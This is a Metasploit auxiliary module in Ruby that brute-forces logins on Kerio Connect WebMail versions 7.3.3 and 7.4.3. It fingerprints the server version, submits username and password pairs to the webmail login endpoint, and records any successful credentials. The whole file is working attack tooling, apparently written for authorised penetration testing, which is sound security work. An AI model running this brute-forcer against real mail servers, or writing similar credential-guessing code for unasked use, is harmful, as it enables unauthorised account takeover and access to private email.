##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Kerio Connect WebMail Brute Force Utility',
      'Description' => %q{
        This module tests credentials on Kerio Connect WebMail servers. The
        supported versions are 7.3.3 and 7.4.3 only. But this script can be
        easily extended to work with other versions.
      },
      'Author' => [
        'mekhalleh (RAMELLA Sébastien)' # https://www.pirates.re/
      ],
      'License' => MSF_LICENSE,
      'Actions' => [
        ["Automatic", { }],
        ["Kerio Connect (version: 7.3.3)",
          {
            'Description' => "Kerio Connect WebMail (version: 7.3.3)",
            'AuthPath' => normalize_uri('webmail', 'dologin.php'),
            'LoginCheck' => /reason=failure/
          }
        ],
        ["Kerio Connect (version: 7.4.3)",
          {
            'Description' => "Kerio Connect WebMail (version: 7.4.3)",
            'AuthPath' => normalize_uri('webmail', 'login', 'dologin'),
            'LoginCheck' => /reason=failure/
          }
        ],
      ],
      'DefaultAction' => "Automatic",
      'DefaultOptions' => {
        'RPORT' => 443,
        'SSL' => true
      }
    ))

    register_options([
      OptAddress.new('RHOST', [true, 'The target address'])
    ])

    deregister_options('BLANK_PASSWORDS', 'RHOSTS')
  end

  def check_creds
    is_empty = true
    each_user_pass do | user, pass |
      is_empty = false unless user.blank? || pass.blank?
      break
    end
    fail_with(Failure::BadConfig, 'Bad login credentials couple') if is_empty
  end

  def get_version
    begin
      received = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri('integration', 'index.php')
      })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{message} HTTP connection refused by the server, aborting")
      return :abort
    end
    unless(received)
      print_error("#{message} No any data received from the server, aborting")
      return
    end

    if received.code == 200
      html = received.get_html_document
      begin
        return parse_query(html.at('a[@title="Open online manual"]').xpath('@href').to_s.split('?')[1])['buildversion']

      rescue NoMethodError, Encoding::CompatibilityError
        return false
      end
    end

    return false
  end

  def message
    return "#{vhost}:#{rport} -"
  end

  # lib/msf/core/exploit/web.rb
  def parse_query(query, sep = '&')
    query = query.to_s
    return {} if query.empty?

    query.split(sep).inject({}) do | h, part |
      k, v = part.split('=', 2)
      h[k.to_s] = v.to_s
      h
    end
  end

  def pick_action
    return action unless action.name.eql? 'Automatic'

    version = get_version
    actions.each do | my_action |
      unless my_action.name == 'Automatic'
        case
        when version.include?("7.3.3") && my_action.name.include?("7.3.3")
          return my_action
        when version.include?("7.4.3") && my_action.name.include?("7.4.3")
          return my_action
        end
      end
    end

    return nil
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def try_user_pass(opts)
    user = opts[:user]
    pass = opts[:pass]
    auth_path = opts[:auth_path]
    login_check = opts[:login_check]
    vhost = opts[:vhost]

    data = "kerio_username=#{user}&kerio_password=#{pass}&kerio_mode=full-or-mini"
    begin
      received = send_request_cgi({
        'method' => 'POST',
        'uri' => auth_path,
        'data' => data
      })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      print_error("#{message} HTTP connection refused by the server, aborting")
      return :abort
    end

    unless(received)
      print_error("#{message} No any data received from the server, aborting")
      return
    end

    if received.code == 302
      return :skip_pass if(received.headers['location'] =~ login_check)
      print_good("#{message} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
      report_cred(
        ip: vhost,
        port: datastore['RPORT'],
        service_name: action.name,
        user: user,
        password: pass
      )
      return :next_user
    end
  end

  def run
    check_creds
    vhost = datastore['VHOST'] || datastore['RHOST']

    @my_action = pick_action
    if @my_action.nil?
      print_error("Couldn't determine the action automaticaly.")
      return
    end
    print_status("#{message} Testing #{@my_action.name}")

    begin
      each_user_pass do | user, pass |
        next if (user.blank?) or (pass.blank?)
        vprint_status("#{message} Trying #{user} : #{pass}")
        try_user_pass({
          user: user,
          pass: pass,
          auth_path: @my_action.opts['AuthPath'],
          login_check: @my_action.opts['LoginCheck'],
          vhost: vhost
        })
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
      print_warning("#{message} HTTP connection error")
    end
  end

end
